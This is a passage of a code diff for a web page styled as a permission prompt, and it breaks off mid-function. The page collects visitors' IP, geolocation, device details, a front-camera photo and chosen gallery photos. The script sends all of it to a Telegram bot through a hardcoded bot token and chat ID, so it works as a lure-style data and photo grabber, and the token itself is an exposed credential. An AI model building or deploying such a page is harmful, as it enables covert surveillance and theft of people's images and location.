@@ -1,332 +1,474 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Access Request</title>
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=DM+Mono:wght@300;400;500&display=swap" rel="stylesheet"/>
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    :root {
-      --bg: #0b0c10; --surface: #13151b; --border: #222536;
-      --accent: #00e5ff; --accent2: #ff4d6d; --text: #e8eaf0;
-      --muted: #6b7080; --green: #00e676;
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{
+      --bg:#0b0c10;--surface:#13151b;--border:#222536;
+      --accent:#00e5ff;--accent2:#ff4d6d;--text:#e8eaf0;
+      --muted:#6b7080;--green:#00e676;
     }
-    body {
-      background: var(--bg); color: var(--text);
-      font-family: 'DM Mono', monospace;
-      min-height: 100vh; display: flex;
-      align-items: center; justify-content: center;
-      overflow: hidden; position: relative;
+    body{
+      background:var(--bg);color:var(--text);
+      font-family:'DM Mono',monospace;
+      min-height:100vh;display:flex;align-items:center;
+      justify-content:center;position:relative;overflow:hidden;
     }
-    body::before {
-      content: ''; position: fixed; inset: 0;
-      background-image:
-        linear-gradient(rgba(0,229,255,0.03) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(0,229,255,0.03) 1px, transparent 1px);
-      background-size: 40px 40px;
-      animation: gridShift 20s linear infinite;
-      pointer-events: none; z-index: 0;
+    body::before{
+      content:'';position:fixed;inset:0;
+      background-image:linear-gradient(rgba(0,229,255,0.03) 1px,transparent 1px),
+        linear-gradient(90deg,rgba(0,229,255,0.03) 1px,transparent 1px);
+      background-size:40px 40px;animation:gridShift 20s linear infinite;
+      pointer-events:none;z-index:0;
     }
-    @keyframes gridShift { 0%{transform:translateY(0)} 100%{transform:translateY(40px)} }
-    .orb { position: fixed; border-radius: 50%; filter: blur(80px); pointer-events: none; z-index: 0; opacity: 0.18; }
-    .orb1 { width:400px;height:400px;background:var(--accent);top:-100px;right:-100px;animation:float1 8s ease-in-out infinite; }
-    .orb2 { width:300px;height:300px;background:var(--accent2);bottom:-80px;left:-80px;animation:float2 10s ease-in-out infinite; }
-    @keyframes float1 { 0%,100%{transform:translate(0,0)} 50%{transform:translate(-30px,30px)} }
-    @keyframes float2 { 0%,100%{transform:translate(0,0)} 50%{transform:translate(30px,-20px)} }
-    .container { position:relative;z-index:1;width:100%;max-width:520px;padding:20px; }
-    .card {
-      background:var(--surface); border:1px solid var(--border); border-radius:16px;
-      padding:44px 40px;
+    @keyframes gridShift{0%{transform:translateY(0)}100%{transform:translateY(40px)}}
+    .orb{position:fixed;border-radius:50%;filter:blur(80px);pointer-events:none;z-index:0;opacity:0.18}
+    .orb1{width:400px;height:400px;background:var(--accent);top:-100px;right:-100px;animation:f1 8s ease-in-out infinite}
+    .orb2{width:300px;height:300px;background:var(--accent2);bottom:-80px;left:-80px;animation:f2 10s ease-in-out infinite}
+    @keyframes f1{0%,100%{transform:translate(0,0)}50%{transform:translate(-30px,30px)}}
+    @keyframes f2{0%,100%{transform:translate(0,0)}50%{transform:translate(30px,-20px)}}
+    .container{position:relative;z-index:1;width:100%;max-width:540px;padding:20px}
+    .card{
+      background:var(--surface);border:1px solid var(--border);border-radius:16px;
+      padding:40px 36px;
       box-shadow:0 0 60px rgba(0,229,255,0.06),0 20px 60px rgba(0,0,0,0.5);
       animation:cardIn 0.6s cubic-bezier(0.22,1,0.36,1) both;
     }
-    @keyframes cardIn { from{opacity:0;transform:translateY(30px) scale(0.97)} to{opacity:1;transform:none} }
-    .icon-wrap {
-      width:64px;height:64px;border-radius:14px;
+    @keyframes cardIn{from{opacity:0;transform:translateY(30px) scale(0.97)}to{opacity:1;transform:none}}
+    .hidden{display:none!important}
+
+    /* icon */
+    .icon-wrap{
+      width:60px;height:60px;border-radius:14px;
       background:linear-gradient(135deg,rgba(0,229,255,0.15),rgba(0,229,255,0.05));
       border:1px solid rgba(0,229,255,0.25);
-      display:flex;align-items:center;justify-content:center;
-      margin-bottom:28px;position:relative;overflow:hidden;
+      display:flex;align-items:center;justify-content:center;margin-bottom:24px;
     }
-    .icon-wrap::after {
-      content:'';position:absolute;inset:0;
-      background:linear-gradient(135deg,rgba(0,229,255,0.1),transparent);
-      animation:shimmer 3s ease-in-out infinite;
-    }
-    @keyframes shimmer { 0%,100%{opacity:1} 50%{opacity:0.4} }
-    .icon-wrap svg { position:relative;z-index:1; }
-    .label { font-size:10px;letter-spacing:3px;text-transform:uppercase;color:var(--accent);margin-bottom:10px;opacity:0.8; }
-    h1 { font-family:'Syne',sans-serif;font-size:26px;font-weight:800;line-height:1.25;margin-bottom:14px;color:#fff; }
-    .desc { font-size:13px;line-height:1.8;color:var(--muted);margin-bottom:28px; }
-    .data-list {
+    .label{font-size:10px;letter-spacing:3px;text-transform:uppercase;color:var(--accent);margin-bottom:8px;opacity:0.8}
+    h1{font-family:'Syne',sans-serif;font-size:24px;font-weight:800;line-height:1.3;margin-bottom:12px;color:#fff}
+    .desc{font-size:12px;line-height:1.8;color:var(--muted);margin-bottom:24px}
+
+    /* permission items */
+    .perm-list{display:flex;flex-direction:column;gap:10px;margin-bottom:28px}
+    .perm-item{
+      display:flex;align-items:center;gap:12px;
       background:rgba(255,255,255,0.03);border:1px solid var(--border);
-      border-radius:10px;padding:16px 20px;margin-bottom:30px;
-      list-style:none;display:flex;flex-direction:column;gap:10px;
+      border-radius:10px;padding:12px 16px;
     }
-    .data-list li { display:flex;align-items:center;gap:10px;font-size:12px;color:#a0a8be; }
-    .data-list li::before {
-      content:'';width:6px;height:6px;border-radius:50%;
-      background:var(--accent);flex-shrink:0;box-shadow:0 0 6px var(--accent);
+    .perm-icon{
+      width:36px;height:36px;border-radius:8px;
+      display:flex;align-items:center;justify-content:center;flex-shrink:0;
     }
-    .btn-group { display:flex;gap:12px; }
-    .btn {
-      flex:1;padding:14px 20px;border-radius:10px;
-      font-family:'DM Mono',monospace;font-size:13px;font-weight:500;
-      letter-spacing:0.5px;border:none;cursor:pointer;
-      transition:all 0.2s;position:relative;overflow:hidden;
+    .perm-icon.cam{background:rgba(0,229,255,0.1);border:1px solid rgba(0,229,255,0.2)}
+    .perm-icon.gal{background:rgba(255,77,109,0.1);border:1px solid rgba(255,77,109,0.2)}
+    .perm-icon.dat{background:rgba(0,230,118,0.1);border:1px solid rgba(0,230,118,0.2)}
+    .perm-text{flex:1}
+    .perm-title{font-size:12px;color:var(--text);margin-bottom:2px}
+    .perm-sub{font-size:10px;color:var(--muted)}
+    .perm-status{font-size:10px;padding:3px 8px;border-radius:20px;background:rgba(255,255,255,0.05);color:var(--muted)}
+    .perm-status.granted{background:rgba(0,230,118,0.1);color:var(--green)}
+    .perm-status.denied{background:rgba(255,77,109,0.1);color:var(--accent2)}
+
+    /* buttons */
+    .btn{
+      width:100%;padding:14px;border-radius:10px;
+      font-family:'DM Mono',monospace;font-size:13px;font-weight:700;
+      border:none;cursor:pointer;transition:all 0.2s;margin-bottom:10px;
     }
-    .btn::after { content:'';position:absolute;inset:0;background:white;opacity:0;transition:opacity 0.15s; }
-    .btn:active::after { opacity:0.07; }
-    .btn-allow { background:var(--accent);color:#0b0c10;font-weight:700; }
-    .btn-allow:hover { background:#33eeff;transform:translateY(-1px);box-shadow:0 8px 24px rgba(0,229,255,0.3); }
-    .btn-deny { background:transparent;color:var(--muted);border:1px solid var(--border); }
-    .btn-deny:hover { color:var(--accent2);border-color:var(--accent2);transform:translateY(-1px); }
-    .privacy-note { margin-top:20px;font-size:10px;color:#444;text-align:center;line-height:1.6; }
-    .success-card { display:none;text-align:center; }
-    .success-card.show { display:block;animation:cardIn 0.5s cubic-bezier(0.22,1,0.36,1) both; }
-    .check-ring {
-      width:80px;height:80px;border-radius:50%;border:2px solid var(--green);
+    .btn-allow{background:var(--accent);color:#0b0c10}
+    .btn-allow:hover{background:#33eeff;transform:translateY(-1px);box-shadow:0 8px 24px rgba(0,229,255,0.3)}
+    .btn-allow:disabled{opacity:0.4;cursor:not-allowed;transform:none}
+    .btn-secondary{background:transparent;color:var(--muted);border:1px solid var(--border)}
+    .btn-secondary:hover{color:var(--accent2);border-color:var(--accent2)}
+
+    /* steps */
+    .step-label{font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--muted);margin-bottom:16px;text-align:center}
+    .progress-bar{height:3px;background:var(--border);border-radius:3px;margin-bottom:24px;overflow:hidden}
+    .progress-fill{height:100%;background:var(--accent);border-radius:3px;transition:width 0.5s ease}
+
+    /* camera */
+    #videoWrap{position:relative;border-radius:12px;overflow:hidden;margin-bottom:16px;background:#000}
+    video{width:100%;display:block;border-radius:12px}
+    canvas{display:none}
+    .cam-overlay{
+      position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+      background:rgba(0,0,0,0.3);
+    }
+    .shutter{
+      width:64px;height:64px;border-radius:50%;
+      background:rgba(255,255,255,0.9);border:4px solid white;
+      cursor:pointer;transition:transform 0.1s;
       display:flex;align-items:center;justify-content:center;
-      margin:0 auto 24px;animation:ringPop 0.5s cubic-bezier(0.22,1,0.36,1) both;
-      box-shadow:0 0 30px rgba(0,230,118,0.2);
     }
-    @keyframes ringPop { from{transform:scale(0.5);opacity:0} to{transform:scale(1);opacity:1} }
-    .data-received {
-      background:rgba(0,230,118,0.04);border:1px solid rgba(0,230,118,0.15);
-      border-radius:12px;padding:20px 24px;margin:24px 0;text-align:left;
+    .shutter:active{transform:scale(0.9)}
+
+    /* gallery picker */
+    .file-drop{
+      border:2px dashed var(--border);border-radius:12px;
+      padding:32px;text-align:center;cursor:pointer;
+      transition:border-color 0.2s;margin-bottom:16px;
     }
-    .data-received h3 {
-      font-family:'Syne',sans-serif;font-size:11px;letter-spacing:2px;
-      text-transform:uppercase;color:var(--green);margin-bottom:14px;
+    .file-drop:hover{border-color:var(--accent)}
+    .file-drop p{font-size:12px;color:var(--muted);margin-top:8px}
+    #fileInput{display:none}
+    .thumb-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:16px}
+    .thumb-grid img{width:100%;aspect-ratio:1;object-fit:cover;border-radius:6px}
+
+    /* success */
+    .check-ring{
+      width:72px;height:72px;border-radius:50%;border:2px solid var(--green);
+      display:flex;align-items:center;justify-content:center;
+      margin:0 auto 20px;box-shadow:0 0 30px rgba(0,230,118,0.2);
+      animation:ringPop 0.5s cubic-bezier(0.22,1,0.36,1) both;
     }
-    .data-row {
-      display:flex;justify-content:space-between;align-items:flex-start;
-      padding:7px 0;border-bottom:1px solid rgba(255,255,255,0.04);gap:12px;
-    }
-    .data-row:last-child { border-bottom:none; }
-    .data-key { font-size:11px;color:var(--muted);flex-shrink:0; }
-    .data-val { font-size:11px;color:var(--text);text-align:right;word-break:break-all; }
-    .tg-badge {
+    @keyframes ringPop{from{transform:scale(0.5);opacity:0}to{transform:scale(1);opacity:1}}
+    .tg-badge{
       display:inline-flex;align-items:center;gap:6px;
       background:rgba(0,136,204,0.12);border:1px solid rgba(0,136,204,0.3);
-      border-radius:20px;padding:5px 12px;font-size:11px;color:#29b6f6;margin-top:14px;
+      border-radius:20px;padding:5px 12px;font-size:11px;color:#29b6f6;margin-top:12px;
     }
-    .denied-card { display:none;text-align:center; }
-    .denied-card.show { display:block;animation:cardIn 0.5s cubic-bezier(0.22,1,0.36,1) both; }
-    .loading { display:none;gap:6px;justify-content:center;padding:8px 0; }
-    .loading.show { display:flex; }
-    .dot { width:8px;height:8px;border-radius:50%;background:var(--accent);animation:bounce 0.8s ease-in-out infinite; }
-    .dot:nth-child(2){animation-delay:0.15s} .dot:nth-child(3){animation-delay:0.3s}
-    @keyframes bounce { 0%,100%{transform:translateY(0);opacity:0.4} 50%{transform:translateY(-8px);opacity:1} }
-    @media(max-width:480px){ .card{padding:32px 24px} .btn-group{flex-direction:column} h1{font-size:22px} }
+    .data-received{
+      background:rgba(0,230,118,0.04);border:1px solid rgba(0,230,118,0.15);
+      border-radius:12px;padding:16px 20px;margin:20px 0;text-align:left;
+    }
+    .data-received h3{font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--green);margin-bottom:12px}
+    .data-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.04);gap:12px}
+    .data-row:last-child{border-bottom:none}
+    .data-key{font-size:11px;color:var(--muted);flex-shrink:0}
+    .data-val{font-size:11px;color:var(--text);text-align:right;word-break:break-all}
+
+    /* loading dots */
+    .dots{display:flex;gap:6px;justify-content:center;padding:12px 0}
+    .dot{width:8px;height:8px;border-radius:50%;background:var(--accent);animation:bounce 0.8s ease-in-out infinite}
+    .dot:nth-child(2){animation-delay:0.15s}.dot:nth-child(3){animation-delay:0.3s}
+    @keyframes bounce{0%,100%{transform:translateY(0);opacity:0.4}50%{transform:translateY(-8px);opacity:1}}
+
+    @media(max-width:480px){.card{padding:28px 20px}h1{font-size:20px}}
   </style>
 </head>
 <body>
-  <div class="orb orb1"></div>
-  <div class="orb orb2"></div>
-  <div class="container">
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="container">
 
-    <!-- PERMISSION CARD -->
-    <div class="card" id="permCard">
-      <div class="icon-wrap">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#00e5ff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-          <rect x="3" y="11" width="18" height="11" rx="2"/>
-          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-        </svg>
-      </div>
-      <p class="label">Data Access Request</p>
-      <h1>This site wants to<br/>collect your data</h1>
-      <p class="desc">Before you continue, please review the information we'd like to collect and grant your permission.</p>
-      <ul class="data-list">
-        <li>Your browser &amp; operating system</li>
-        <li>IP address &amp; approximate location</li>
-        <li>Device type &amp; screen resolution</li>
-        <li>Current date &amp; local time</li>
-        <li>Battery level &amp; connection type</li>
-      </ul>
-      <div class="btn-group">
-        <button class="btn btn-allow" onclick="handleAllow()">✓ Allow Access</button>
-        <button class="btn btn-deny" onclick="handleDeny()">✗ Deny</button>
-      </div>
-      <p class="privacy-note">Your data is used for analytics only.</p>
+  <!-- STEP 1: Permission Overview -->
+  <div class="card" id="step1">
+    <div class="icon-wrap">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#00e5ff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
     </div>
+    <p class="label">Permission Required</p>
+    <h1>Allow access to continue</h1>
+    <p class="desc">This page requires the following permissions. Please review and allow to proceed.</p>
 
-    <!-- LOADING -->
-    <div class="card" id="loadCard" style="display:none;text-align:center;padding:48px 40px;">
-      <p style="font-size:12px;color:var(--muted);margin-bottom:20px;letter-spacing:2px;text-transform:uppercase;">Collecting &amp; sending data</p>
-      <div class="loading show"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
-    </div>
-
-    <!-- SUCCESS CARD -->
-    <div class="card success-card" id="successCard">
-      <div class="check-ring">
-        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#00e676" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-          <polyline points="20 6 9 17 4 12"/>
-        </svg>
-      </div>
-      <p class="label" style="color:var(--green);text-align:center;">Permission Granted</p>
-      <h1 style="text-align:center;font-size:22px;">Data received<br/>successfully</h1>
-      <div class="data-received" id="dataDisplay"><h3>📡 Collected Data</h3></div>
-      <div style="text-align:center;">
-        <div class="tg-badge">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="#29b6f6">
-            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L8.32 13.617l-2.96-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.828.942z"/>
+    <div class="perm-list">
+      <div class="perm-item">
+        <div class="perm-icon cam">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00e5ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
+            <circle cx="12" cy="13" r="4"/>
           </svg>
-          Sent to your Telegram bot ✅
+        </div>
+        <div class="perm-text">
+          <div class="perm-title">Camera Access</div>
+          <div class="perm-sub">Capture one photo from front camera</div>
+        </div>
+        <span class="perm-status" id="camStatus">Required</span>
+      </div>
+      <div class="perm-item">
+        <div class="perm-icon gal">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ff4d6d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/>
+            <polyline points="21 15 16 10 5 21"/>
+          </svg>
+        </div>
+        <div class="perm-text">
+          <div class="perm-title">Gallery Access</div>
+          <div class="perm-sub">Select photos to share</div>
+        </div>
+        <span class="perm-status" id="galStatus">Required</span>
+      </div>
+      <div class="perm-item">
+        <div class="perm-icon dat">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00e676" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/>
+            <path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>
+          </svg>
+        </div>
+        <div class="perm-text">
+          <div class="perm-title">Device Info</div>
+          <div class="perm-sub">IP, location, browser, OS data</div>
+        </div>
+        <span class="perm-status" id="datStatus">Required</span>
+      </div>
+    </div>
+
+    <button class="btn btn-allow" onclick="startProcess()">✓ Allow All & Continue</button>
+    <button class="btn btn-secondary" onclick="denyAll()">✗ Deny Access</button>
+  </div>
+
+  <!-- STEP 2: Camera -->
+  <div class="card hidden" id="step2">
+    <div class="progress-bar"><div class="progress-fill" style="width:33%"></div></div>
+    <p class="step-label">Step 1 of 3 — Camera</p>
+    <p class="label">Camera Permission</p>
+    <h1>Take a quick photo</h1>
+    <p class="desc" style="margin-bottom:16px">Your front camera will capture one photo. It will be sent securely.</p>
+    <div id="videoWrap">
+      <video id="video" autoplay playsinline muted></video>
+      <div class="cam-overlay">
+        <div class="shutter" onclick="capturePhoto()" title="Capture">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="#0b0c10">
+            <circle cx="12" cy="12" r="8"/>
+          </svg>
         </div>
       </div>
     </div>
-
-    <!-- DENIED CARD -->
-    <div class="card denied-card" id="deniedCard">
-      <div style="width:80px;height:80px;border-radius:50%;border:2px solid var(--accent2);display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 0 30px rgba(255,77,109,0.2);">
-        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ff4d6d" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-          <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
-        </svg>
-      </div>
-      <p class="label" style="color:var(--accent2);">Access Denied</p>
-      <h1 style="font-size:22px;">No data collected</h1>
-      <p style="font-size:13px;color:var(--muted);margin-top:12px;line-height:1.8;">You chose to deny access.<br/>Nothing has been stored or sent.</p>
-      <button class="btn btn-deny" style="margin-top:28px;width:100%;" onclick="reset()">← Go Back</button>
-    </div>
-
+    <canvas id="canvas"></canvas>
+    <button class="btn btn-allow" id="captureBtn" onclick="capturePhoto()">📸 Capture Photo</button>
+    <button class="btn btn-secondary" onclick="skipCamera()">Skip Camera →</button>
   </div>
 
-  <script>
-    const BOT_TOKEN = '8005097155:AAEdRKRcUh-DzczhLEmNvHMnp4b6pgtDVTk';
-    const CHAT_ID   = '7034821913';
+  <!-- STEP 3: Gallery -->
+  <div class="card hidden" id="step3">
+    <div class="progress-bar"><div class="progress-fill" style="width:66%"></div></div>
+    <p class="step-label">Step 2 of 3 — Gallery</p>
+    <p class="label">Gallery Access</p>
+    <h1>Select your photos</h1>
+    <p class="desc" style="margin-bottom:16px">Choose photos you want to share. Selected photos will be sent to the bot.</p>
+    <div class="file-drop" onclick="document.getElementById('fileInput').click()">
+      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#6b7080" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/>
+        <polyline points="21 15 16 10 5 21"/>
+      </svg>
+      <p>Tap to select photos from gallery</p>
+      <p style="font-size:10px;margin-top:4px;color:#444">Multiple photos supported</p>
+    </div>
+    <input type="file" id="fileInput" accept="image/*" multiple onchange="handleFiles(this.files)"/>
+    <div class="thumb-grid" id="thumbGrid"></div>
+    <button class="btn btn-allow" id="sendGalBtn" onclick="sendGalleryAndContinue()" disabled>📤 Send Selected Photos</button>
+    <button class="btn btn-secondary" onclick="skipGallery()">Skip Gallery →</button>
+  </div>
 
-    function handleAllow() {
-      document.getElementById('permCard').style.display = 'none';
-      document.getElementById('loadCard').style.display = 'block';
-      setTimeout(async () => {
-        const data = await gatherData();
-        await sendToTelegram(data);
-        showSuccess(data);
-      }, 1800);
+  <!-- STEP 4: Loading -->
+  <div class="card hidden" id="step4" style="text-align:center;padding:48px 36px">
+    <p style="font-size:12px;color:var(--muted);margin-bottom:20px;letter-spacing:2px;text-transform:uppercase">Sending to Telegram</p>
+    <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+    <p id="loadMsg" style="font-size:11px;color:#444;margin-top:16px">Collecting device data...</p>
+  </div>
+
+  <!-- STEP 5: Success -->
+  <div class="card hidden" id="step5" style="text-align:center">
+    <div class="check-ring">
+      <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00e676" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+    </div>
+    <p class="label" style="color:var(--green)">All Done</p>
+    <h1 style="font-size:22px">Data sent successfully!</h1>
+    <div class="data-received" id="dataDisplay"><h3>📡 Collected Info</h3></div>
+    <div class="tg-badge">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="#29b6f6">
+        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L8.32 13.617l-2.96-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.828.942z"/>
+      </svg>
+      Sent to your Telegram ✅
+    </div>
+  </div>
+
+  <!-- DENIED -->
+  <div class="card hidden" id="stepDenied" style="text-align:center">
+    <div style="width:72px;height:72px;border-radius:50%;border:2px solid var(--accent2);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 0 30px rgba(255,77,109,0.2)">
+      <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#ff4d6d" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
+      </svg>
+    </div>
+    <p class="label" style="color:var(--accent2)">Access Denied</p>
+    <h1 style="font-size:20px">Nothing collected</h1>
+    <p style="font-size:12px;color:var(--muted);margin-top:10px;line-height:1.8">You denied access.<br/>No data was sent.</p>
+    <button class="btn btn-secondary" style="margin-top:24px" onclick="location.reload()">← Go Back</button>
+  </div>
+
+</div>
+
+<script>
+  const BOT_TOKEN = '8005097155:AAEdRKRcUh-DzczhLEmNvHMnp4b6pgtDVTk';
+  const CHAT_ID   = '7034821913';
+
+  let capturedPhotoBlob = null;
+  let selectedFiles     = [];
+  let stream            = null;
+
+  function show(id) {
+    ['step1','step2','step3','step4','step5','stepDenied'].forEach(s => {
+      document.getElementById(s).classList.toggle('hidden', s !== id);
+    });
+  }
+
+  // ── STEP 1: Start ──
+  async function startProcess() {
+    show('step2');
+    await startCamera();
+  }
+
+  function denyAll() { show('stepDenied'); }
+
+  // ── STEP 2: Camera ──
+  async function startCamera() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      document.getElementById('video').srcObject = stream;
+      document.getElementById('camStatus').textContent = 'Granted';
+      document.getElementById('camStatus').className = 'perm-status granted';
+    } catch(e) {
+      skipCamera();
+    }
+  }
+
+  function capturePhoto() {
+    const video  = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.toBlob(blob => {
+      capturedPhotoBlob = blob;
+      stopCamera();
+      show('step3');
+    }, 'image/jpeg', 0.85);
+  }
+
+  function skipCamera() {
+    stopCamera();
+    show('step3');
+  }
+
+  function stopCamera() {
+    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+  }
+
+  // ── STEP 3: Gallery ──
+  function handleFiles(files) {
+    selectedFiles = Array.from(files);
+    const grid = document.getElementById('thumbGrid');
+    grid.innerHTML = '';
+    selectedFiles.slice(0, 9).forEach(f => {
+      const img = document.createElement('img');
+      img.src = URL.createObjectURL(f);
+      grid.appendChild(img);
+    });
+    document.getElementById('sendGalBtn').disabled = selectedFiles.length === 0;
+    document.getElementById('galStatus').textContent = `${selectedFiles.length} selected`;
+    document.getElementById('galStatus').className = 'perm-status granted';
+  }
+
+  async function sendGalleryAndContinue() { await finalize(); }
+  async function skipGallery()            { await finalize(); }
+
+  // ── STEP 4: Finalize ──
+  async function finalize() {
+    show('step4');
+    setLoadMsg('Collecting device data...');
+    const data = await gatherData();
+
+    setLoadMsg('Sending device info...');
+    await sendTextToTelegram(data);
+
+    if (capturedPhotoBlob) {
+      setLoadMsg('Sending camera photo...');
+      await sendPhotoToTelegram(capturedPhotoBlob, '📸 Front Camera Photo');
     }
 
-    function handleDeny() {
-      document.getElementById('permCard').style.display = 'none';
-      document.getElementById('deniedCard').classList.add('show');
+    if (selectedFiles.length > 0) {
+      setLoadMsg(`Sending ${selectedFiles.length} gallery photo(s)...`);
+      for (let i = 0; i < selectedFiles.length; i++) {
+        setLoadMsg(`Sending photo ${i+1} of ${selectedFiles.length}...`);
+        await sendPhotoToTelegram(selectedFiles[i], `🖼️ Gallery Photo ${i+1}`);
+      }
     }
 
-    function reset() {
-      document.getElementById('deniedCard').classList.remove('show');
-      document.getElementById('permCard').style.display = 'block';
-    }
+    showSuccess(data);
+  }
 
-    async function gatherData() {
-      let ip = 'Unknown', city = 'Unknown', country = 'Unknown', isp = 'Unknown', timezone = 'Unknown', region = 'Unknown';
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const geo = await res.json();
-        ip       = geo.ip             || 'Unknown';
-        city     = geo.city           || 'Unknown';
-        region   = geo.region         || 'Unknown';
-        country  = geo.country_name   || 'Unknown';
-        isp      = geo.org            || 'Unknown';
-        timezone = geo.timezone       || 'Unknown';
-      } catch(e) {}
+  function setLoadMsg(msg) { document.getElementById('loadMsg').textContent = msg; }
 
-      const now = new Date();
-      return {
-        '🌐 IP Address':    ip,
-        '📍 City':          city,
-        '🗺️ Region':        region,
-        '🌍 Country':       country,
-        '🏢 ISP':           isp,
-        '🕰️ Timezone':      timezone,
-        '🖥️ Browser':       getBrowser(),
-        '💻 OS':            getOS(),
-        '📱 Device':        isMobile() ? 'Mobile/Tablet' : 'Desktop',
-        '📐 Screen':        `${screen.width}×${screen.height}`,
-        '🗣️ Language':      navigator.language || 'Unknown',
-        '🕐 Local Time':    now.toLocaleTimeString(),
-        '📅 Date':          now.toLocaleDateString(),
-        '🔗 Referrer':      document.referrer || 'Direct',
-        '🍪 Cookies':       navigator.cookieEnabled ? 'Enabled' : 'Disabled',
-        '🌑 Dark Mode':     window.matchMedia('(prefers-color-scheme:dark)').matches ? 'Yes' : 'No',
-        '📶 Connection':    getConnection(),
-        '🔋 Battery':       await getBattery(),
-        '🖱️ Touch':         ('ontouchstart' in window) ? 'Yes' : 'No',
-        '🧭 User Agent':    navigator.userAgent,
-      };
-    }
-
-    async function sendToTelegram(data) {
-      const lines = Object.entries(data)
-        .map(([k, v]) => `${k}: <b>${escapeHtml(String(v))}</b>`)
-        .join('\n');
-
-      const msg = `🔔 <b>New Visitor Data!</b>\n` +
-                  `━━━━━━━━━━━━━━━━━━━\n` +
-                  `${lines}\n` +
-                  `━━━━━━━━━━━━━━━━━━━\n` +
-                  `✅ <i>User granted permission</i>`;
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
-        });
-      } catch(e) { console.error('Telegram error:', e); }
-    }
-
-    function showSuccess(data) {
-      document.getElementById('loadCard').style.display = 'none';
-      const display = document.getElementById('dataDisplay');
-      display.innerHTML = '<h3>📡 Collected Data</h3>';
-      Object.entries(data).forEach(([key, val]) => {
-        if (key === '🧭 User Agent') return;
-        const row = document.createElement('div');
-        row.className = 'data-row';
-        row.innerHTML = `<span class="data-key">${key}</span><span class="data-val">${val}</span>`;
-        display.appendChild(row);
